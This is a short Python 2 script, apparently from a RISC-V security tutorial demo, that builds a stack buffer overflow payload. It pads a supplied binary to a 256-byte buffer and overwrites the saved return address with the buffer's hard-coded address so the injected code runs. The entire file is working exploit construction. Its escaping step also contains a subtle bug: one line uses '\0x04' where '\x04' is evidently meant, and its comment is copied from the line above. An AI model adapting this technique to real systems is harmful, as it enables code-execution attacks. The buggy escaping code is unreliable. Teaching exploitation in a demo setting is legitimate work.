#!/usr/bin/python
# -*- coding: utf-8 -*-
# ************************************************************************
#
# (C) COPYRIGHT 2016 TECHNOLUTION BV, GOUDA NL
# | =======          I                   ==          I    =
# |    I             I                    I          I
# |    I   ===   === I ===  I ===   ===   I  I    I ====  I   ===  I ===
# |    I  /   \ I    I/   I I/   I I   I  I  I    I  I    I  I   I I/   I
# |    I  ===== I    I    I I    I I   I  I  I    I  I    I  I   I I    I
# |    I  \     I    I    I I    I I   I  I  I   /I  \    I  I   I I    I
# |    I   ===   === I    I I    I  ===  ===  === I   ==  I   ===  I    I
# |                 +---------------------------------------------------+
# +----+            |  +++++++++++++++++++++++++++++++++++++++++++++++++|
#      |            |             ++++++++++++++++++++++++++++++++++++++|
#      +------------+                          +++++++++++++++++++++++++|
#                                                         ++++++++++++++|
#                                                                  +++++|
#
# ************************************************************************
""" tool to build exploit for RISC-V tutorial demo
    
    author: Jonathan Hofman (jonathan.hofman@technolution.eu)
"""

import logging
import argparse
import struct

#################################################################################
## obtainOptions
#################################################################################
def obtainOptions():
    """ Obtain the application options. Currently the application is only 
        configured using command line arguments.
    """
    parser = argparse.ArgumentParser(description="usage: %prog [options]")
    parser.add_argument("-b", "--bin_file", dest = "bin_path", 
                      help = "bin file with application code", default='exploit.bin')
    parser.add_argument("-o", "--output_file", dest = "output_path", 
                      help = "output filename", default='exploit.raw')

    args = parser.parse_args()

    if args.bin_path is None:
        print "Error: bin file not set"
        exit(-1)

    if args.output_path is None:
        print "Error: output file not set"
        exit(-1)
    
    return args 

#################################################################################
## main
#################################################################################

if __name__ == "__main__":
    logging.basicConfig(level   = logging.DEBUG,
                        format  = '%(asctime)s [%(levelname)-8s] %(message)s',
                        datefmt = '%H:%M:%S')   
    options = obtainOptions()

    sp_address = 0x80002ec4
    buffer_address = sp_address
    buffer_size = 256
    ra_offset = buffer_size + 12
    sp_ra_address = sp_address + ra_offset
    prev_sp_address = sp_address + ra_offset + 4 # 1 alignment word and one ra work

    logging.info("{:<26} : 0x{:08x}".format('stack address', sp_address))
    logging.info("{:<26} : 0x{:08x}".format('previous stack address', prev_sp_address))
    logging.info("{:<26} : 0x{:08x}".format('ra address', sp_ra_address))
    logging.info("{:<26} : 0x{:08x}".format('buffer address', buffer_address))
    
    ra_stack_value = struct.pack('<L', buffer_address)
    print repr(ra_stack_value)
    bin = open(options.bin_path, 'rb').read()
    
    # expand the output
    if len(bin) > 256:
        logging.error("The program is larger than the buffer space that is available in the exploit. Most likely the"
                      "exploit will fail.")
        
    output = bin
    
    # excape all caracters that are handled specially in the main program
    # we use 0x04 as it does not trigger the 'decode code' to contain excape 
    # caracters the value 32 that is added to the escape is a little random, but 
    # was chosen as it is a normal character.
    output = output.replace('\n', '\x04' + chr(ord('\n') + 32)) # replace \n with \n + 32
    output = output.replace('\r', '\x04' + chr(ord('\r') + 32)) # replace \r with \r + 32
    output = output.replace('\b', '\x04' + chr(ord('\b') + 32)) # replace \b with \b + 32
    output = output.replace('\0x04', '\x04' + chr(ord('\x04') + 32)) # replace \b with \b + 32
    
    # pad the buffer until the ra positon on the stack
    output = output + ('\x00' * (buffer_size - len(output)))

    # append the value for the return adress on the stack
    output = output + (4 * ra_stack_value)
    
    open(options.output_path, 'wb').write(output)    
